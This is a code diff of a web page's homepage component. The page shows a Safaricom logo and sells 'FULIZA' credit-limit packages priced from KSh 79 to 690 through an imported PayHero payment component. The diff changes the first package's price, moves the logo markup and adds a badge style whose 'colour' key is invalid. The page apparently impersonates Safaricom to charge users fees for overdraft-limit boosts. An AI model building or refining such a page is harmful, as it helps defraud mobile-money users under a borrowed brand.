@@ -5,7 +5,7 @@ import PayHeroPayment from './components/PayHeroPayment'
 
 export default function Home() {
   const packages = [
-    { limit: '5,000', fee: 49 }, { limit: '7,500', fee: 100 }, { limit: '10,000', fee: 140 },
+    { limit: '3,000', fee: 79 }, { limit: '7,500', fee: 100 }, { limit: '10,000', fee: 140 },
     { limit: '12,500', fee: 160 }, { limit: '16,000', fee: 200 }, { limit: '20,000', fee: 260 },
     { limit: '24,500', fee: 310 }, { limit: '29,500', fee: 350 }, { limit: '33,000', fee: 420 },
     { limit: '38,500', fee: 490 }, { limit: '43,000', fee: 560 }, { limit: '50,000', fee: 690 }
@@ -61,10 +61,9 @@ export default function Home() {
       <nav className="navbar">
         <div className="navbar-container">
           <a href="#" className="navbar-brand">
-            <div className="navbar-logo-holder">
-              <img src="./app/safaricom.png" alt="Safaricom" className="navbar-logo-img" />
-            </div>
+            <img src="/safaricom.png" alt="Safaricom" className="navbar-logo-img" />
             <div>
+              
             </div>
           </a>
           <div className="navbar-menu">
@@ -123,7 +122,7 @@ export default function Home() {
               <div className="package-card" key={idx}>
                 <div className="package-card-header">
                   <span className="package-name">FULIZA {pkg.limit}</span>
-                  <span className="package-badge">Available</span>
+                  <span className="package-badge" style={{colour:'black'}}>Available</span>
                 </div>
                 <div className="package-amount">KSh {pkg.limit}</div>
                 <div className="package-fee">
